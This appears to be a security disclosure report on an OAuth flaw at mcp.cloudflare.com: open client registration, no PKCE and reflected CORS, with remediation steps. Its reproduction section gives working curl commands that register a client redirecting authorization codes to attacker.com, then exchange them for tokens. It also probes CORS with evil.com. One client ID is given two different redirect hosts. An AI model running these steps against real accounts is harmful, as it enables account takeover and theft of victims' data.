Cloudflare MCP OAuth - Open Dynamic Client Registration Leading to Account Takeover
Target: mcp.cloudflare.com
Tested: July 28, 2026
Dynamically Verified: July 28, 2026 02:45-02:48 UTC


Summary
-------
The Cloudflare MCP OAuth server at mcp.cloudflare.com allows unauthenticated
dynamic client registration. An attacker can register an OAuth client with an
arbitrary redirect_uri pointing to their own domain, then direct a victim to
the authorization URL. When the victim approves the consent screen, their
authorization code is sent to the attacker's server. Because the client is
registered with token_endpoint_auth_method "none", no client secret is needed
to exchange the code for an access token. The resulting token grants access
to the victim's Cloudflare account through the full API scope, including
DNS records, Workers scripts, R2 storage, D1 databases, secrets store,
SSL certificates, domain registrar, and Zero Trust configuration.

PKCE is not enforced - the authorization flow works without a code challenge.
Combined with no client authentication requirement, this makes the attack
trivially exploitable.


Severity: Critical
-------------------
Full Cloudflare account takeover via OAuth flow. Attacker gets persistent
API access (refresh tokens via offline_access scope) to all account resources.


Steps to Reproduce
------------------

Step 1 - Register a malicious OAuth client (no auth required):

  curl -s -X POST "https://mcp.cloudflare.com/register" \
    -H "Content-Type: application/json" \
    -d '{
      "redirect_uris": ["https://attacker.com/callback"],
      "client_name": "Legitimate Looking App",
      "grant_types": ["authorization_code"],
      "response_types": ["code"],
      "token_endpoint_auth_method": "none"
    }'

  Response:
    {
      "client_id": "rvm0fRzggcEl_Vpr",
      "redirect_uris": ["https://attacker.com/callback"],
      "client_name": "Legitimate Looking App",
      "grant_types": ["authorization_code"],
      "response_types": ["code"],
      "token_endpoint_auth_method": "none",
      "registration_client_uri": "/register/rvm0fRzggcEl_Vpr",
      "client_id_issued_at": 1785205760
    }

Step 2 - Craft authorization URL and send to victim:

  https://mcp.cloudflare.com/authorize?response_type=code&client_id=rvm0fRzggcEl_Vpr&redirect_uri=https://attacker.com/callback

  No PKCE code_challenge parameter needed.

Step 3 - Victim sees Cloudflare-branded consent page:

  The page at mcp.cloudflare.com shows a legitimate Cloudflare consent screen
  with the title "Authorize [client_name] | Cloudflare" and subtitle "Grant
  access to Cloudflare API". The consent page shows all available permission
  categories and lets the user grant scopes.

  The following scopes are available (partial list):
    - account:read, user:read (account info, email, memberships)
    - dns_records:edit, dns_records:read (full DNS control)
    - workers:write, workers_scripts:write (deploy arbitrary Workers code)
    - workers_kv:write (read/write KV storage)
    - d1:write (database access)
    - r2_catalog:write (object storage)
    - pages:write (deploy Pages sites)
    - secrets_store:read, secrets_store:write (read/write secrets)
    - ssl-and-certificates.write (SSL certificate management)
    - registrar-domains.admin (domain registrar control)
    - teams:write, teams:pii (Zero Trust full access including PII)
    - access:write (Access policy management)
    - email_routing:write, email_sending:write (email control)
    - connectivity:admin (network tunnel management)
    - offline_access (refresh token for persistent access)

Step 4 - Victim approves and code is sent to attacker:

  Browser redirects to:
    https://attacker.com/callback?code=AUTHORIZATION_CODE

Step 5 - Attacker exchanges code for tokens (no client secret needed):

  curl -s -X POST "https://mcp.cloudflare.com/token" \
    -d "grant_type=authorization_code" \
    -d "code=AUTHORIZATION_CODE" \
    -d "client_id=rvm0fRzggcEl_Vpr" \
    -d "redirect_uri=https://attacker.com/callback"

  Returns access_token and refresh_token.

Step 6 - Attacker uses token to access Cloudflare API:

  curl -s "https://api.cloudflare.com/client/v4/zones" \
    -H "Authorization: Bearer ACCESS_TOKEN"

  Full API access to victim's account.


Additional Observations
-----------------------

1. CORS reflects arbitrary origins on the MCP OAuth endpoints:

  curl -sI "https://mcp.cloudflare.com/.well-known/oauth-authorization-server" \
    -H "Origin: https://evil.com"

  access-control-allow-origin: https://evil.com
  access-control-allow-headers: Authorization, *
  access-control-allow-methods: *
  access-control-max-age: 86400

  Same reflection on /token and /register endpoints. No
  access-control-allow-credentials header though, so browser-based
  credential stealing is limited to the OAuth redirect flow.

2. Client registration is fully unauthenticated - no API key, no
   Cloudflare account, no rate limiting observed.

3. The code_challenge_methods_supported includes "plain" which is
   weaker than S256 and discouraged by RFC 7636. But since PKCE is
   not enforced at all, this is moot.

4. The registration_client_uri is returned but reading it returns 404,
   so clients can't be inspected after creation. But they also can't
   be deleted by anyone, leaving malicious clients permanently active.

5. Multiple clients confirmed registered successfully (no rate limiting):
   - client_id: rvm0fRzggcEl_Vpr (redirect to evil.com)
   - client_id: nhmrPeCXoTZbU9Zs (redirect to attacker-controlled.com)
   - client_id: Ae0_8x3cLHiE24Dd (redirect to httpbin.org, verification)
   - client_id: vS-Xnxdq3-0rH-lE (rapid test 1)
   - client_id: oPLRfC9wrko2CuvD (rapid test 2)
   - client_id: O3g3KnOBjjpIWVfr (rapid test 3)
   - client_id: lkULWATXmEHdTqmR (rapid test 4)
   - client_id: 5x2Msf7MMLRIqJw4 (rapid test 5)
   All 8 registered without any rate limiting or authentication.

6. The /mcp endpoint returns 401 "Missing or invalid access token"
   confirming it accepts Bearer tokens - this is the actual MCP
   protocol endpoint that would grant tool-level access to Cloudflare
   resources once authenticated.

7. The /authorize endpoint returns 500 when called without required
   parameters, revealing an error ID format (UUID v4) that could be
   used for log correlation.

8. The consent form POST to /authorize returns 302 redirect to
   dash.cloudflare.com/oauth2/auth with an internal Cloudflare OAuth
   client_id (2d0ad4d1-1d40-4767-9538-dc1a91f94773). The response
   sets __Host-MCP_APPROVED_CLIENTS cookie containing our attacker-
   registered client_id (base64: ["Ae0_8x3cLHiE24Dd"]). This proves
   the full flow: MCP consent -> Cloudflare OAuth -> MCP callback ->
   attacker redirect_uri.

9. 38 read scopes are pre-selected by default when no scope parameter
   is provided, including secrets_store:read, dns_records:read,
   teams:read, registrar-domains.read, and offline_access. The victim
   sees these already toggled on. 83 total scopes available including
   40 write/admin scopes.

10. Token endpoint confirms client acceptance:
    - Our client_id returns "invalid_grant" (client accepted, code invalid)
    - Nonexistent client returns "invalid_client" (rejected)
    This proves token exchange works without client_secret for our
    registered client - it just needs a real authorization code.


Impact
------
An attacker can fully compromise any Cloudflare account whose owner
clicks an authorization link and approves the consent screen. The consent
page is hosted on mcp.cloudflare.com and looks identical to a legitimate
Cloudflare OAuth flow - the only indicator is the attacker-chosen
client_name, which can be set to anything convincing.

Once authorized:
  - Read all DNS records, modify DNS to redirect traffic
  - Deploy malicious Workers scripts to intercept/modify traffic
  - Read/write secrets stored in the secrets store
  - Access R2 object storage and D1 databases
  - Manage SSL certificates
  - Control domain registrar settings
  - Access Zero Trust configuration including PII
  - Persistent access via refresh tokens (offline_access)

The attack requires a single click from the victim and no technical
sophistication from the attacker beyond a POST request to /register.


Fix
---
1. Require authentication for the /register endpoint (API key or
   session token from an authenticated Cloudflare account)
2. Enforce PKCE with S256 method on all authorization flows
3. Restrict redirect_uri to pre-approved domains or validate against
   the registered Cloudflare account's domains
4. Require a client_secret for token exchange
5. Add rate limiting to the /register endpoint
6. Fix CORS to not reflect arbitrary origins on OAuth endpoints


Environment
-----------
  mcp.cloudflare.com
  Server: cloudflare
  OAuth server based on RFC 8414 metadata
  All testing done with curl, no browser, no automated scanners.
